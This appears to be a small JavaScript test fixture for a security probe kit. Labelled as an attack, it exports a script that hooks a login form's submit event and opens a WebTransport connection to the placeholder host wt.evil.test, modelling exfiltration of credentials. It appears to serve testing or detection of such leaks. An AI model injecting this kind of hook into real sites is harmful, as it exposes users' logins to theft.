// Attack: data sent over WebTransport on submit.
import { scenario } from './probe-kit.js';

export const respond = scenario(() => `document.getElementById('login').addEventListener('submit', function () {
  try { new WebTransport('https://wt.evil.test:4433/c'); } catch (e) {}
});`);
